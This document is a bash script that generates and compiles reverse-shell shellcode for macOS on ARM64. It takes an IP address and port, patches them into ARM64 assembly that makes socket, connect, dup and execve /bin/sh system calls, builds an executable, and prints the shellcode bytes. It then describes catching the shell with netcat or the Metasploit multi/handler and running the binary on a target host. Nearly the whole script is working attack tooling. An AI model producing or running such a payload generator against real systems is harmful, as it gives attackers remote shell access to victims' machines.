#!/bin/bash
clear 
echo "************************************************************"
echo "    Automatic shellcode generator - FOR MACOS ARM64         "
echo "    Reserve connect shell                                   "
echo "    Based on daem0nc0re examples                            " 
echo "    https://github.com/daem0nc0re/macOS_ARM64_Shellcode     " 
echo "    Make sure you have xcode installed on your M1           "
echo "************************************************************"
# check if we have xcode in place else fail 
if [[ $(xcode-select -p | grep 'CommandLineTools') != *CommandLineTools ]]; then
  echo "compiler not found ? rung gcc and install it"
  exit 1 
fi
echo -e "What IP are we connecting to ? : \c"
read IP 
echo -e "What Port Number are we connecting to? : \c"
read port

# Cleanup 
# rm shellcode.exe shellcode.o shellcode.s Makefile 

# Working with the IP variable 
IFS=. read ip1 ip2 ip3 ip4 <<< "$IP"

# Converting to HEX + adding padding 0 
hexip1="$(printf '%02X\n' $ip1)" 
hexip2="$(printf '%02X\n' $ip2)"
hexip3="$(printf '%02X\n' $ip3)"
hexip4="$(printf '%02X\n' $ip4)"   
hexport="$(printf '%02X\n' $port)"

# Flipping to Little Endian the hexport value 
v=$hexport 
flippedport="$(echo ${v:6:2}${v:4:2}${v:2:2}${v:0:2})"
#echo $flippedport 

# Dumping the reverse /bin/sh connect back  shellcode skeleton 
cat <<EOF > shellcode.s 
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
    mov  x16, #97
    lsr  x1, x16, #6
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337
    mvn  x3, x0

call_connect:
   mov  x1, #0x0210
   movk x1, #0xFFF1, lsl #16
   movk x1, #0xFFF2, lsl #32 
   movk x1, #0xFFF3, lsl #48 
   str  x1, [sp, #-8]
   mov  x2, #8
   sub  x1, sp, x2
   mov  x2, #16
   mov  x16, #98
   svc  #0x1337
   lsr  x2, x2, #2

call_dup:
    mvn  x0, x3
    lsr  x2, x2, #1
    mov  x1, x2
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  call_dup

call_execve:
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov  x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
EOF

# Replace the shellcode variables in steps 
sed  "s/FFF1/$flippedport/g" shellcode.s > shellcode1.s
rm -f shellcode.s 

# combine ip variables to groups so we can substitute them 
subst1=($hexip2$hexip1)
#echo $subst1 
sed  "s/FFF2/$subst1/g" shellcode1.s > shellcode2.s
rm -f shellcode1.s 
subst2=($hexip4$hexip3)
sed  "s/FFF3/$subst2/g" shellcode2.s > shellcode.s
rm -f shellcode2.s 

echo "Finally building object and executable shellcode"
echo ""
echo 'LDFLAGS=-lSystem -syslibroot `xcrun -sdk macosx --show-sdk-path` -arch arm64' > Makefile
echo '' >> Makefile
echo '%.o: %.s'>> Makefile 
echo '		as $< -o $@' >> Makefile
echo '' >> Makefile 
echo 'all:shellcode' >> Makefile
echo '' >> Makefile
echo 'shellcode: shellcode.o' >> Makefile
echo '		ld $(LDFLAGS) -o shellcode.exe shellcode.o' >> Makefile 

make 

echo ""
echo "Shellcode : "
echo ""
for c in $(objdump -d ./shellcode.o | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n '\x'$c
done
echo ""
echo ""
echo 
echo "You can use the above generated shellcode directly in your C code" 
echo "To catch a remote shell start netcat like >  nc -nlp port " 
echo "Or use Metasploit framework exploit/multi/handler + payload/cmd/unix/reverse_netcat " 
echo "shellcode.exe can be used directly on the target host to connect back to you"
